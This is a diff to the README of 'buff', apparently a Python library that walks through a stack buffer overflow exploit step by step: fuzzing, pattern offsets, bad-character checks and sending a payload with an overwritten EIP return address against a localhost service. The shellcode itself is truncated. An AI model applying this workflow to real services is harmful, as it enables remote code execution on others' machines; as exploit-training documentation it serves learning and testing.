@@ -16,28 +16,25 @@
 
 I made a [template as well](https://github.com/the-robot/buff/blob/master/examples/template.py).
 
-## Fuzzer
+## Setup Runner
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337))
+runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "", postfix = "")
+```
+
+## Fuzzer
+```python
 runner.fuzz()
 ```
 
 ## Sending Pattern
 ```python
-import buff
-
-runner = buff.Buff(target = ("127.0.0.1", 1337))
 runner.sendPattern()
 ```
 
 ## Find Pattern Offset
 ```python
-import buff
-
-runner = buff.Buff(target = ("127.0.0.1", 1337))
-
 BUFFER_SIZE = 1100
 offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
 print(offset)
@@ -45,10 +42,6 @@ print(offset)
 
 ## Sending Bad Characters
 ```python
-import buff
-
-runner = buff.Buff(target = ("127.0.0.1", 1337))
-
 runner.setBufferSize(2400)
 runner.setEipOffset(1978)
 runner.sendBadChars()
@@ -62,26 +55,22 @@ runner.sendBadChars(fake_eip = "\x44\x44\x44\x44")
 
 ## Sending Exploit
 ```python
-import buff
-
-runner = buff.Buff(target = ("127.0.0.1", 1337))
-
-# Set Buffer Size
+# Set buffer size
 runner.setBufferSize(2400)
 
-# Set Eip offset
+# Set EIP offset
 runner.setEipOffset(1978)
 
 # Set return address
 eip_address = "\xaf\x11\x50\x62"
 runner.setEipAddress(eip_address)
 
+# Set padding
+runner.setPaddingSize(16)
+
 # Set exploit
 exploit = ("\xdb\xde.....")
 runner.setExploit(exploit)
-
-# Set padding
-runner.setPaddingSize(16)
 
 runner.sendExploit()
 ```
